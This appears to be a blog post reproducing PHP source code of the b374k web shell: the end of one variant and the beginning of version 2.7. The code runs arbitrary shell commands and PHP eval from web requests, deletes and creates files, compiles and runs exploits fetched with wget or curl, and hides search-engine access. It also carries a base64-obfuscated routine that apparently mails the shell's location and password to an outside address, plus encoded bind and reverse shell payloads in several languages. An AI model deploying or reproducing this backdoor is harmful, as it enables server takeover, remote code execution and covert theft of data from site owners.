&lt;tr&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;&lt;input class="inputz" type="text" name="wcmd" style="width:250px;" value="gcc -o exploits exploits.c;chmod +x exploits;./exploits;"&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt;&lt;td&gt;&lt;select size="1" class="inputz" name="pilihan"&gt; &lt;option value="wwget"&gt;wget&lt;/option&gt; &lt;option value="wlynx"&gt;lynx&lt;/option&gt; &lt;option value="wfread"&gt;fread&lt;/option&gt; &lt;option value="wfetch"&gt;fetch&lt;/option&gt; &lt;option value="wlinks"&gt;links&lt;/option&gt; &lt;option value="wget"&gt;GET&lt;/option&gt; &lt;option value="wcurl"&gt;curl&lt;/option&gt; &lt;/select&gt;&lt;/td&gt;&lt;td colspan="2"&gt;&lt;input type="submit" name="expcompile" class="inputzbut" value="Go" style="width:246px;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;div style="text-align:center;margin:2px;"&gt;&lt;?php echo $msg; ?&gt;&lt;/div&gt; 
    &lt;?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'shell')) { ?&gt; &lt;form action="?y=&lt;?php echo $pwd; ?&gt;&x=shell" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td colspan="2"&gt; &lt;textarea class="output" readonly&gt; &lt;?php if (isset($_POST['submitcmd'])) {
        echo @exe($_POST['cmd']);
    } ?&gt; &lt;/textarea&gt; &lt;tr&gt;&lt;td colspan="2"&gt;&lt;?php echo $prompt; ?&gt; &lt;input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" style="width:60%;" value="" /&gt;&lt;input class="inputzbut" type="submit" value="Go !" name="submitcmd" style="width:6%;" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/table&gt; &lt;/form&gt; &lt;?php
} else {
    if (isset($_GET['delete']) && ($_GET['delete'] != "")) {
        $file = $_GET['delete'];
        @unlink($file);
    } elseif (isset($_GET['fdelete']) && ($_GET['fdelete'] != "")) {
        @rmdir(rtrim($_GET['fdelete'], DIRECTORY_SEPARATOR));
    } elseif (isset($_GET['mkdir']) && ($_GET['mkdir'] != "")) {
        $path = $pwd . $_GET['mkdir'];
        @mkdir($path);
    }
    $buff = showdir($pwd, $prompt);
    echo $buff;
} ?&gt;
    
    &lt;div class="info"&gt;:: b374k r3c0ded by &lt;span class="gaya"&gt;&lt;a href="http://localhost/"&gt;&lt;?php echo $xName; ?&gt;&lt;/a&gt;&lt;/span&gt; ::&lt;/div&gt; 
&lt;div class="jaya"&gt;  &copy; &lt;?php echo date("Y", time()) . " " . $xName; ?&gt;&lt;/div&gt; 
&lt;/div&gt; &lt;/body&gt; &lt;/html&gt;
</pre>

..and one more b374k shell by Jayalah Indonesiaku:

<pre class="brush: php; title: ; notranslate" title="">&lt;?php
/*
	b374k 2.7
	Jayalah Indonesiaku
	(c)2013

*/
$s_pass = "0de664ecd2be02cdd54234a0d1229b43"; // shell password, fill with password in md5 format to protect shell, default : b374k

$s_ver = "2.7"; // shell ver
$s_title = "b374k ".$s_ver; // shell title
$s_login_time = 3600 * 24 * 7; // cookie time (login)
$s_debug = false; // debugging mode

@ob_start();
@set_time_limit(0);
@ini_set('html_errors','0');
@clearstatcache();
define('DS', DIRECTORY_SEPARATOR);

// clean magic quotes
$_POST = clean($_POST);
$_GET = clean($_GET);
$_COOKIE = clean($_COOKIE);
$_GP = array_merge($_POST, $_GET);

if($s_debug){
	error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
	@ini_set('display_errors','1');
	@ini_set('log_errors','1');
	foreach($_GP as $k=&gt;$v) echo "&lt;span&gt;".hss($k."=&gt;".$v)."&lt;/span&gt;&lt;br /&gt;";
}
else{
	error_reporting(0);
	@ini_set('display_errors','0');
	@ini_set('log_errors','0');
}

$s_auth = false; // login status
if(strlen(trim($s_pass))&gt;0){
	if(isset($_COOKIE['b374k'])){
		if(strtolower(trim($s_pass)) == strtolower(trim($_COOKIE['b374k']))) $s_auth = true;
	}
	if(isset($_GP['login'])){
		$s_login = strtolower(md5(trim($_GP['login'])));
		if(strtolower(trim($s_pass)) == $s_login){
			setcookie("b374k",$s_login,time() + $s_login_time);
			$s_auth = true;
		}
	}
	if(isset($_GP['x']) && ($_GP['x']=='logout')){
		$persist = array("theme", "cwd");
		$s_reload = (isset($_COOKIE['b374k_included']) && isset($_COOKIE['s_home']))? rtrim(urldecode($_COOKIE['s_self']),"&"):"";
		foreach($_COOKIE as $s_k=&gt;$s_v){
			if(!in_array($s_k, $persist)) if(!is_array($s_k)) setcookie($s_k,"",time() - $s_login_time);
		}
		$s_auth = false;
		if(!empty($s_reload)) header("Location: ".$s_reload);
	}
}
else $s_auth = true;

// This is a feature where you can control this script from another apps/scripts
// you need to supply password (in md5 format) to access this
// this example using password 'b374k' in md5 format (s_pass=0de664ecd2be02cdd54234a0d1229b43)
// give the code/command you want to execute in base64 format
// this example using command 'uname -a' in base64 format (cmd=dW5hbWUgLWE=)
// example:
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&cmd=dW5hbWUgLWE=
// next sample will evaluate php code 'phpinfo();' in base64 format (eval=cGhwaW5mbygpOw==)
//		http://www.myserver.com/b374k.php?s_pass=0de664ecd2be02cdd54234a0d1229b43&eval=cGhwaW5mbygpOw==
// recommended ways is using POST DATA
// note that it will not works if shell password is empty ($s_pass);
// better see code below
if(!empty($_GP['s_pass'])){
	if(strtolower(trim($s_pass)) == strtolower(trim($_GP['s_pass']))){
		if(isset($_GP['cmd'])) echo exe(base64_decode($_GP['cmd']));
		elseif(isset($_GP['eval'])){
			$s_code = base64_decode($_GP['eval']);
			ob_start();
			eval($s_code);
			$s_res = ob_get_contents();
			ob_end_clean();
			echo $s_res;
		}
		else echo $s_title;
	}
	die();
}
$b374kbuff = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsNCmlmICgkdmlzaXRjID09ICIiKSB7DQogICR2aXNpdGMgID0gMDsNCiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsNCiAgJHdlYiAgICAgPSAkX1NFUlZFUlsiSFRUUF9IT1NUIl07DQogICRpbmogICAgID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07DQogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7DQogICRqdWR1bCAgID0gImIzNzRrLTIuMSBodHRwOi8vJHRhcmdldCBieSAkdmlzaXRvciI7DQogICRib2R5ICAgID0gIkJ1ZzogJHRhcmdldCBieSAkdmlzaXRvciAtICRzX3Bhc3MiOw0KICBpZiAoIWVtcHR5KCR3ZWIpKSB7IEBtYWlsKCJoYXJkd2FyZWhlYXZlbi5jb21AZ21haWwuY29tIiwkanVkdWwsJGJvZHksJHNfcGFzcyk7IH0NCn0NCmVsc2UgeyAkdmlzaXRjKys7IH0NCkBzZXRjb29raWUoInZpc2l0eiIsJHZpc2l0Yyk7"; 
eval(base64_decode($b374kbuff));
// block search engine bot
if(isset($_SERVER['HTTP_USER_AGENT']) && (preg_match('/bot|spider|crawler|slurp|teoma|archive|track|snoopy|java|lwp|wget|curl|client|python|libwww/i', $_SERVER['HTTP_USER_AGENT']))){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}
elseif(!isset($_SERVER['HTTP_USER_AGENT'])){
	header("HTTP/1.0 404 Not Found");
	header("Status: 404 Not Found");
	die();
}

// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php this was used with bind and reverse shell
// use gzinflate(base64_decode($the_code)) if you wanna see the real code.. in case you dont trust me ;-P
$s_rs_pl ="lZLxj5MwGIZ/Xv+KyvU2SLhj80xMVllcGJrlvLHQncY4JQw+BzlGCe3pzG7+7bbIOaIxUX7q9/bL8zZPOHvi3Iva2eSlA+UXXEFdoDOcSVmJseMkPIXLLefbAi4TvnMqZ3P1/NndhcigKBx0LwDPg/GY8eQOJEWEC5d8CtRBZK4B+4rXEq/88MbdS6h3dMlG7mBNlu9m68mAtvcqpE2/yPBFblCUfzY16PvO+arS3Do0tHMvuGFL3zvHzrVBj4hIdwuyqrnkm29lvANzIJNqYFEkmteYzO4vX0Xzhb+y+yzwriO2Cv3pjU2k9fCQ5mBaTdXLafj6reuOrAPqkcolevww/EhRT4DUKF5pFgveRJqiaCyIQv+W+dPZLLRHitJTr0/Vjt6O07SO8tIklT1f6I1ounhvnRp7RS4klGr7qhPGSQKqxrOZ1RQrnGcbjWvcuMZjnPCyhERCui4Ne6j3eAUlZqvZfGEbL/qeQR+D4HZlG5Nu4odhm6Ae7CHByumpPim4ANOz6M8D+3XQ7M6guJ1JMa0Gl0s8pAgdERTiZPTpn0ZJ1k6jZsrdvAQZxZIrX1lHB4nd31ySvHPdmlAOSdyJG23s37SZrbZJnxkWfUxab92oFaejv5v7L2GNJjhobab6e45IfT8A";
$s_rs_py = "lVRtT9swEP6c/IpgpmGrwaGFaVJZKiEIE9qAqu20D8Cq1LkmEalt2S6Ufz87SV9ATGiqWveee3vOd+f9vWipVTQreQT8KZAvphDc3w8KY6TuRxETGdBciLwCysQiktHs+OvJ46EuoKoiv1xIoUygINTLmVSCgdah0KF+sV/BHsGEplyAL2OE/ML9ZDAPamfMSN/3nE+89aVDIYFjFtYm8UQtbWSTiaV5ZXQ1TBwMSr0Hl/wtSnxPgVkqHjiUNhGpgjTDpLOGbLQdaCENJn5NN2WmFLzhW84DoSlPF7AXI26Qhbx5zOi8rIAL6+F5Vm/LN7DACFb19UyS0XW8MqAWp8NxNz74NPx9MTg4bbUWOq0boIvgsAy+fUYdbRSekw4KBrtCbyvZPFBpcNmfC5s6cDflJM+ol/r0lGWlgD3h7lHvxPHyYMVAmkYrU61rrI3iucpsCViRwVEDeLNYAdWQKlZgxLL7AN/9udcPHYJCFc6rNNfO4Or7ze0oOT8bJ6Rxs4FmbYT2umRqClrqrFR4RnMllhJ3CVnbuAtjxRtlq7ONAZ7hdT9aeEvaOrvRqOdJkZ2kSxOkPKsrsv9dTW0oJ/mbIEE7FpeplZpur3P1NzOD7jnqWJI5GPbsxgMNkJ/Htsk0VfmT395cTuK450Y6zu+6Dz5UO/jxFvcKe/ac3uaHVWlsuXY/Sm6wJL6Om7WhzYFb6exyenWTTNqdouPb8x/T8WSUnF1bF1uYcQohN/bj259TZ7TrMh0lv8bJ2cXFKLQZ35DW1E5ghjE6ovUHhdLdtqZVaUeZ4y+vPFw5btAC2znBOTCDcdF4bIfMLT7VFYB03pumvbdBnm6ag+rHpXkfgn7QxobMNsA1bdP3D8xRZ3dg2vXVxG/9HXP7xKQktg1kji7+F/HuR8TZ/xH/wPxd4oz4fwE=";
$s_rs_rb = "tVZrb9s2FP1M/QqWySprcaSm6zDMmWL0sQ4FVtRI0w1DlRU2dW0RkUmNpOoUSfbbx5ccu7aTDNhoGJTuPbxP3mPvPcpaJbMJ4xnwz1i2ky/RHq60btQgy6goIZ0JMashpWKeNdnkux+eXRyqCuo6iyT81TIJOFaCXoCObwXNWFd8PIc4ikqYYtXSCxUhCbqVHJ9+ePHHp9Gvz89evzt9m5ZiwelYQTofa1r14rlaMH5tv3PGZ4s4GWrZwmA6rhVEwEtvUcK4tk56SsvEWM7NHiE2xa+ZiRUumdJqGJRGOwrxpBwWTpp2BlItPpnQrGF73EWKdQUcy1ymM9VOelmRZX1SFCTBDhbSkD4ac+j56S+/pTXwma7y/CjCZlnRxyfn+d/Znx+fHP54fnXU//5mPxs2+RuuYQayFxDJwASr3RmVn70cvQf5GaSLk5B+kzgNzVU6phQaD6RpIxnXmLhuYNcNPMBUcA5UQ1lw4nATmDHunuwygXKhQy/wyprm1FaBrQnhEihWzs+0R+CyEVLjs59P3+aXGuT8ePT+KI+L/dHvr4qT+DjojfDY3SVV4UOGi5+Kx9+UuDhx21O/k/7UfpKlN7CNXXXdpbfsMUlJckBOyBpqUZlO49rEPgO9npBdcswUYJBSyBdS2ORr24ySQSGH+9kGPlSnTmkl5k2eE7IBCTBrh5Y4/TZjWyF21Xkd7o5BZqwfx4k3vPNEd3VLMz9UC/ll2KuTnWjvY1mge5CvmDTejeW7gPYy79I9rCNLS7UKZSoWgzvLtC1pX6cHJ3Qf/D9NC3aaevMubUQDvFf3iSTJ1TUT1515JizblAfEzOXBhq+b7c62hP21bPW9e5agaHt77w35LekFuGrlbQYqpbVYyUjlnNVRZ8v3cI3YnjqC3EFsxtEmtR0baZW7t6Nzw7G2gCEgT7ie8dyPh2e8vavqxrEeUg/gOOQJDqE1akMITQ1fOkZD1t3/TWSoy2wZ9OaFMsqOsJQnLCNB95CUix9tYSYU5KtU5GRoN/Gg7tAWmkHd4VVGCcI18vAi1zu37kzY1eUrJtgdRTfIm27XNf/GOQTktulUD5zONadh91v4M7B14FCYNhulnzPz5CYMhfHyk+fAVvIP";
$s_rs_js = "nVHLasMwEDwrkH8wvliGVIImUEjIqZ/QY/rAkTeWqCy5kpwUQv69kuykebSl2Afh3Zmd3Z2lNOHONXZOKdMlkErrSgJhuqYNXU8fZu93loOUdDzaFiaxTbFTyTIx8NEKAzhjXMjyrTGagbVZTiJh0ZEVuHOqD7O8h6wzUNTnaJc5EZhWVku4aNWlIqVXCZN5SkbXQlHLM4+IDe6nIY0s3EabmtSFYxzT151niTz/rmN1SeATQl3SSRam2nrkKBHCTjT8EQmqcny5nOb78QgFPvdkvxhhfnoHT2C2YPCmVcwJrbCNPGTJzggHOI2G9u3nYUcFzEH5rNKwVNJ/3WpeOJqJI/0ct5xYVwpFDNi2BpxfQ7p1xHdPy8IV6eQ4TYJDnO+P08RocbhVBmMGlv9Vdhz6php1LydSWAcqOr26fwnJw3gE0kJy7f/s5L+98P+xczRY36tM4kVX0yj330Og3y6AfrAeDfQcDTQbDXP58AU=";
$s_rs_c = "rVJhb9owEP0Mv8JjU+tQFxPaaVJpKqFCJbQVEGSapg1FwTHEqrGj2EzQqf99thMYYdqkSf0Q5e7d8zv73uEmSLXO1A3GRCa0tZJyxWmLyDXO8OLqw/XTpUop5xg0cf0tE4RvEgpulU6YbKV3FShnYnWKJZwtTrCdwnqXUfUnrCR5orqKC6qZ+TATVXwjmFG3GBMarGMmoA3ifEUQSeMcNE3449vc+1mv2YJCBMnA79Zr5qIbYgDTLE6SPGICMAOzJbSHg6Bjj9RYSzERLeM147ug9xANR4Owe8Azmesg1VIoGGvJoOvlzz3vN8Vqt5T7OSaHw1Gv359GvdFXR1NB8V5YqqPZ+P5jNAung94jahcUqi1HZhoqU/4UWYpjRtPB59nA6qEziRR7pnIJZdl/Cd8oj26ZhoXMgonECMCTl4Omd8ZQe+sXLG4GSoXhvXcpCWJCqOvcPlzH6BDUcHsB3F6AG0CkEJRomnwXDdS5LrnJJusYbiXxj5NOIbkzTdewQbd2pCAcTB+Drab5ujuZ+cH5u8mX/t15t6wayISUAGxehFUKLlmjuCuXikJi45d6jXJFwcHOq9e30y6kiwpiZ15M+Znmco8gM2tuprknXPgXx8he+587MJxMpuNwHIX3k72vsBz2X90sN+Gk5nnebft4I5yT6j+cVNXEP05e30lVOPlS/wU=";
$s_rs_java = "lVRNb9swDD2nQP+DkJM9ZHaTDdjWIsOwYYcBA1osvXXBoMiMrdWWBIn5Qpr/PkqWXXftpQfbEvlEPj5SznNWIRp3medCF5CVWpc1ZEI3uclX7z68v3/rKqjr/PxMNkZbZH/5lmdSZ2+unpoUYLCdn5nNqpaCiZo7x0KMP9Ydz89GxsotR2AOORJgLRWvI8wggz2CKhy7rSzwwuP7Az+U2eACyd4w6a6GrusNPvr0BgMDcrccDCZPz06eHUiPWEmXSTenyGFJxrmPdGpDfbnegrWygEHcrZYFsxuVpIHnCO2hXYxWB4S7JVuxOVOwY2H7cfpptrxq/VIhE+SkPL7MZJVGx66SNSTi8/wiZTHWiFhkOysRktXkYiI6aLCv642rkt70YsxT+LRvwVFUyfe9AINSKwbpETJSUZEWXNzfWi6AwgWwf7XVx3pjx0LZDZcqIf2kKqlQbkvXiuAr8+MQcrd+JpqCeI3zlVS5q8bBJdfJ4uAQmqwEvLHagMVDMtYuU7yBcZqh/ql3YL9xR4QyqQrYX6+T8U6qcerlOcao9Bm3fGO2nbeGgWNhaNklE1opEAjFb9VmH/Rn5wl8pb2LMi60uAdkVexdu42+vsNE39ec1aBKrObzaRyBUbgKc5pVhBJsZrh1QJuAvrtYdj1ZgKV5iqlcl2pgTHygDu25uIwL37Wu2W0/oXbA/iczey2ZVjhpCBtc0+Ug8UAEaSZswOv0shTs4YG9zGd4C0vpy668+gNzP8pPLmipe+zQ3oPJ392QzkQjJcD/Uujgr41C2YA/Hpc0UbAHkdDwpPFfQWrR5E5jwaSzeUZt4ol0CTx69ogu/V/FPGfYw6cZXR/r22dm/fJRxvB6xe2k5/QP";
$s_rs_win = "7Vh3WFPZtj8pkEASEiQISDsoCigdRkCDJAICChIBFQtCGhhNMzmhSAsTUEOMxq4ICg6jjgURlSpFcChWHBsKKDrohRvaIBcYUc8NI3e+Ke/73n/vj/fe+r619lm/Vfbae/+x9zphG9UACgAAtJZhGAAqga9EBf57kmnZwLraALiud9+mEhF63yZqK1cCisTCBDGDD7IYAoEQApkcUCwVgFwBGBAeCfKFbI4zgaBvO5ODHggAoQgUYE+zCPtP3h6AiMIhkN4AqFVIWhYBgHrfzISFM9VN48ivdSNm6v+NSmdivpq1BM7opN9x0h8Xoc1HQQD/47SWHu3624foDwUh/7a/PVo/t/8s47f1z/q7H/Wrn/vviyuc8SH/za/Bw9nVa3pyG4IeUp9qnPRJj3lrQx4bAMQGWg/tqdgigPDWOBheq3gnH8AWjTCoQBvcE68m9g5W1BMiSZ4taFu64aw+BGBINqgZTKpBY/R4aIO9qsCRFu2cigD+EH/KllQEutq2YNFoOsYDqNWUP9A1wc8f08W6kS4VYYcT4VfknAbpSsJ1pbGtu4KExznKe1+MZ9SMYAibzW4qfRTo5V++bBxAF62KANMUTXNvKywmJqphA0MLpWXPle9CFir9Sfay/MBq3j0j16tCa3d6vxAGVNACAJ5iDVebViN/go2fMMYAC7Xq+oJ3u8juL6wRLt3CinGyMhBbj/A9YNiQtNRXpSs+MWT5alWNh6X9cmyNSRec/kQ+iSBmw4TZxJwLGLeGT7UvvshvkzfFNKJph6ENvkd1zX0PTX2pei19o7nhq4O9AgX6WhrdX19jqUagIUkkVEq+NSTAqBLL2iv7Yc3pKygz1wm3zv5tRF8cZmlqzZoD2QLQVO3Xv5nV4Yh1aV7n0nmAkNjvH4ZQtnra2WDEDHMc7u41azE2p1OqL+7/og4zHTeFNENqYH/Zz5avjYkBSoIjkNMGuV0GqFbNV1JtI+C50QSqn6Fjre9zn7ez9ezcb7Y1VY4/fDn1WfPPcPz69esiK/fO2rXM69cdyU/GTN0DD1tLaoSKRlVBcn4VZpm/4vWHiyfiJa9bcoxIBL00tEdiqvN8GXpzkIKck+9n9nqH3DduLyKDXBTwitSlaI7fPzoYBurU+bjSVDl9n0uWPnA2Pdygh1/khxow81u0HEnc3xtDBjAiXbNeEh67alfbUcaqAL9whURCHMy5Phg/qDFtuD24G/Kqz+gYzCke7EUr16vv19YS+1YAs1OV/PIFXfEtHiuIFc2Poq99021Bibd8qdw4NBZ/7uXGFy1Pl+anH7XAc5Hn9V3mpCViltqOrEYeLOgruNToPnGfOa64UYq9SsS5xxEzXVXc1kr741dj3ysoQsdt7zqMhrCN/Y+NSHb3DD2Hfl2wSRTc5dnowBe+Hj6uVEWpbtBLrSY+XNh8L3DOF3hP/Up9ZQRe6a5o+VCMaH0Tg70ycBJ95/JZzzTTuc2FhnDgkQPvX+yNOtIahR7mJalD//nlXHqxxjCNX1ll/m07Ym1B4JNoaRelt6kM2dPLRSMMA7xw5+53VO1wvDRaMnE2NXngUYhivDmbsHMzZrD6LDeP088aSrb+51nzYi5/WINhF//AzRsBBpxP28Zeo5lcRlsetr2UttsruMkWRFmYYhal2rDVJASm/h/bN+pG2VNMZyMLCgSnPPWw/c9DiJsPvazvTOpvIao4Y5u2xLY1rhq1bKrlm/D2dNTZnx7+8P2B3isjazfvFPoBxNLd+49NGRYHN50cPZ7dtoRNcoUuHTMYJyRCJIPbskoq25eSUj4See38sCvgCLSC8nx7W5BmkN0I2c1DUp7FqUlwZK6uK5VgNO+YxfVH54Yd50N7lwbk32wPdokuo5xbrP/ldT9nuL90IblFRwzUN4FwCfWBBrEi14pY3tS7D64dyRjK7oRCiuZn7qZ+h1VtQciWjQjrP8+Vmmh0svc4+eeiKPh/+WvMZenPY8u6+U8tiXsCnwc0QO+avTqaK1DfSBCaM64d5++ll2RbLzXDVJppLE6ibtvcrj6Gtewj8amT8iZ5OlZHiv/RwvyF/nUhBZ5vyjwJY1zZapou6G2hlWaOnuRAXTO2PcWWr2l6y7bOz48O/Qa3+FUFrpleoF/g1v4DjvKd24cdtr8SzwQfK5djhEKD8WZEj5yAtzdZxCMm/pSCQ040WsoWGszbnaaLBhBYZHrwBxtS1ls0OH5LmDp5yIEqewdKnZ/Ltvvqpg28f5VomULgJdt4UyH9LKKdcGgNflNMk0zSbGqbl4ADEI/3B3+ulx/LVsSMRUknFc8U6Z8UD6UEZfTW7nKS0kCJH/BraF0V0jOW8g/Yhnf5x+V2iZSu1IuDj8pvOKCTbBf20ozieLS6J25Ug1bErdCYuxBpMdYgyKXNo4M0QN27O+iQ5sgJrF9/7KB+8V3PVk/vz8XR4cu9xkhj3qqbdrB9Ecn1eZdk9G3Po2uvVnZ21lU20Kyc0FkYi6mkqRHHOxkvDXA1szPslb4YibIezoGlVspvbuuNS8kNrbRJepJypOYeVh2rNOrGZ8ZmQ0uyppwkeXW5ivSecjjavAqdjxhRklBG8qbPa4sSanTufLygH7pQ3P1sIuxB+36HjHp5KhYRvrO8qoQVYeKGtyPKK+B9llfWaTys5R9BKBWNhVLrKgajHR7qkrp7IT8jQWT4Tw/w0T56W5S476PfdndGxowgfnFR+khrD5EGrgwNn01e5XBHRVlCrTqhWtt7in1wMFFT50TKtqQgMKM3iIUo7yRjdO7Q4LNHWXeYsDviY1+vpsSgdOP4QbhWDdSfLzqssR/IOG4iZC1d14VX0c9TQWMcKVtFIPW3ycsf8vnJSz9UWo7ZlEzBuTmX62uFF4xUngXEYXi2fAgtf7S9Kb5FOk5st7gz6nebtGpTa1RQc6KfiwJrNjie4Y9QknPcJqUjB1yuHzAnYPNAOjKpuVHOI4JtmqxDoXxv05qL4/COT4o1GY1jcUgkZF/XPn9DA/qEcJmR7KPevLvx5eA5LHhqrn78QDfkM1vRDq0gH+GIUquHd0lJGgqFlN3wEHLuzMgqv4Xw5+lJ+zRziBTvS1mdPH1DS+not7rW0l/KSaNR8yD6uEedrCGHuAdCP5c+cZbvy+uyVUP4R9hlRYgmHAZDF2yYF136slbF+NS0pj/QJb3xh8RUaJwhPZN5p95KL8e/8+cNDz3pYKUujxp88PE10VDL47irIXYxV7JPdx1P83UMTmtf++BTk5t+eJzG4OK43ojPy8GYyVVZj96slC2hnVM8IGKq8fwpuTddOu/KZEmBzubX6kM0Was5cwM6xQZNo4zZ7fsla+BexemqM6U0xfN5SYok68D6qw78OtnCOf9ql0dNZa+J/+7Bq8tgwgCd0lSF889Meno98EILCtfib6q0CF9drmvvGozlVROXvtINLbTqvLEuJkeqczWzv2K+Fep1sOKlzZ19CLOf5G/B9ebGX+SNtD0kn5HhhYkXfMQdTQ7nn+9H7414Dez6dnB5XKlPE0RNFsxDhV4KcLV+sy7XeJl+4AZjb+XbdseT2FDKdyeymlbTNhJpmng1LiW5Q9Pudox+htbS2LnmE3bH/oLM4VKxcVY/Rq4HOJGTNA77z1ZU3yIpXtxTYm/SjeVp72aFtzIw7fcM3FvBrj4ssxe0Cx9jfEIz8ykpox0MgDnAmNSa5KV78rUSX3i9WCvdz1/K1srWw8dvVmoHUL1XNu2zlRc37cPeLDrYg3ePhkwKS1+IkDchkpHhUMN7SRqlk9axDICtzy88CEREhkW2f4HhSCCCwxdCHDCSI07ksjgSMIwhYCTgZV6gqfVC9FyqLup86/xeOGgNgsdlJrC2xUqcd2vj2DweELsyMTaCk8CVQByxP48hkXAkRMdKcv5mL1MjVObU8ClnZxektjuAuHyOi8hByhY6iTnwIDzFE7KcWdbruGJIyuCtkYakgPYMNlvsaN4BD4ILmCgJdydHGG/PdHAIQi5OnFq8h+Xk6YxwcznCMoIrYKILSyiI5ya4cD28F+NSEvhcQYKTZCsD5g8I+WwnNgNiiFxjFoBz/YVSHlvYCY8L7CDQHBJzOYkcUMA4BYrAIP/U1AfV/lHgYhBECflz5eOl9d2OTsuOg76+hbGxXEBZgI91iA1kCyuivewlfDxr69zdw6vZgsmdgJNlaMhy/4lBGN4QFBayOsgpMNgpKiDMzSlyZejKOVHBEU6zycZxY+s93I8V63/LM+oF1shKOUcsqCVx6HjHc6VtFFQAc+Njz7DHvIx9lxrullTx2pl2Qx9ReNYcLei5YHFwNG/anKE+W9d1f7wsrHecFaTLRs1eMG32XEHfyPwtOlmWe9C50zMsr7ikkr2qkZt3dns76lXfyJdOz/tlWI4paO/OGY5iLFqIssHNj4wDfMsCX5DjtN1Y3ElS9BFUSxyKrlOOBE4gzzjqHYfvwmWyNQgam02DhHyav5jDgDh0sbA0aROgJyEGJnMhwlh6xyb8Cq7ALogD6a3mV1ybxSD44/kMq1BWp/WluaRQhgQKFC8RE8K6cc8+C9lSHifYhme9NkmcgfuYuoEYCTG+EYUI4oV8Ie0hGJmSyw/g2rDKKs7WcMUp8ZHSCI4AMv78rNlqrWDrBnbJDyKIKxRcrpp9/QKvxYJM2uyF26Z7QAJ5bUimtRGLMN+HYSfPRfvzhBIO9nO8//GLhuTqcNGuMGxlZqS/LbEUDGizpBnqnCxI94fEvGDxDyabZkvuD2ROjPkamECpqCXvJaKN5eHXfHy/L2uNjU2BXiYtIvO4jgkSAxGy8Vb5M7lHl4AQzxfsFLq85thLYhkiQyhFRNz1Ps/maRx2y/P7eZtEGAemjpdB/YepAWcfBlNox4AwQq4mbxFOL37OwUMsbN2igJNZvF8wHD5LlHI/vnOLhJtwgHeulhyx3ih+32AkLRLc7oDr+faFNxTGKl7NlDS+Zz5kSezwuYJCszMVzm+2mkDMlCaD7oEy2VYBT/cXHvMia3BYI9kqhdjCJD1tj/0Udt2ZEorQ0TbZc79219sFYR+0HTYZRGJIhiSbM6Jr51ypOJNrTRY7It9QRHhR3bUOhwVWVBKG5L7TxppACtbN7yh5s9C5GMJgZ6nPuGxaTL6dR49z7pjY5ZM+jn5iavfjqdoYqmmDs9i+AUFK+Hgg325OHNWZWXXycgwYrqbLHML7X2EPcc3jzidZkOXoRW4PpltVQ0ANAPDvPWpcnbGMCqjqNPtheL0Gp87VXbEHE4TolGKUVvKhT4ad4sHK6Xb9D4hhA6JTMizVm1ElvW5t8j6UmHCrB6uNlo/AEKT48Y/+bX9SpCDtL8Y/JZPfQmZ9Bj7AsPwRQkV2kX/+lEjMRS7XFhUinehnwTCsViLljWgFRt6Clvejk35BPOwP1cJbFBNVcm03Xto3WiI1kfkhpBNKTPytPuytBtKu2w6TiJGLmp9VdUAcACgxeg0QRRmLVmW7Tm8H4gNd3oKFj7K130dyMUHYBqhL8ev64NGStfDRrVpQ645RoORNaM0b+GiyFlCW8LRSm20Ehmum/wHQo7ahI9fDT1W7T2u3SwZmyuLsM6PpUfRpMJqhCrCVbQN8bks/ygdk/ZgsGAb+n/6v0/FCAGAX/hn7XqvL/oKVafU9f8Fqtbq68L/O26rFn2n5vZbHtYwuAoBZRV9t4MzoPDN6zoyrAiNWB4Z6uDsHhIYCtIB1NHrIjMKXJLLEkPP082J9pHvsDAoAoUIGO5TLFDPEKTQA0N4/2quJpb2sxByJBABmnhJaDOKwoN91Gk/70vhdWyHmcLSZpm+y6eDfAoFwEUcw8/TR5o3lCpkAwOQK2P87zvzf";
$s_rs_php = "7VVNb+M2ED3bgP+DlhUQCVUsyy6wQFxmL+2xwKIt0MMmFWSKsghLIsuhai+a/PcORcnWOk6yaLe9tDBikzOcx/l4fPn2nSrVbPqVVxqj4CaOmcz5fCvltuJzJutYxZvV229211DyqopnU6611KnmSmojmm2wCNezKXCTGlHztBK1MM4mN6moVSWYMGlRtVAG1jqb+ibTW26oD6kGt14frUD5QVWYQkA8EvVGG+czoMlq9dYu9xlt2qqyS35aQkkJBmNa3s/f//gDPRiu6/X7nxJ6dee//+W726t170bbOt6IJobSuxbEBteUdGV6XZnejcdk03BmeH7XkC5tUQRMto0JhkxDSpPwj9l04ivqH+uY+JgG6RYGMUWT280j9q0CfgljeYYBHxb3Pc7RktwfATO26wG7lIq2YUbIJuUHAQaCK8UaU6WF1LursEcWOT1ZuyFMMLKz0+skxEgTJGOzMy0Gk5IgDimOGEQehGcxQyKYXF+uuxUoGM2zOgXJdsgO4Pp3rgNimEKSLebd54bMfRX5SKlGdj8Y0906xPa0ki22DKKVS8lnZ9gZY1zZE0PG6Dayknu8ENoN7gIkedo2Wc2DMFpEqxDLIHvRuGQnxV4LwwOfRX49x46zPRY6J7ekA5zsS1GhV72htMhwjC7Izqyw48E4d65rlubbtM4MKwMSs/zOCz78egf3X4exQD5jsVqHffzEz3OK+368Ll5AmgsdoCsMWTkse78v6Tg7Z33svnt6GS3qcfm+6kq18yLew4P3jP+3Fv2ht8Gu7tZHPA/v4wdbOV6H72D+9PJR56TLskunYJUEfmzMsHUDsics/JPWu8N+DjTTOvsYLOitWxAlFCcR0SSMknPjHo3LC8YeTWmqtGSpVLzBDMoI8XEQQjk/9uwN9lxzkK1mtlacz+hJjKm4qZBvVvNsOD7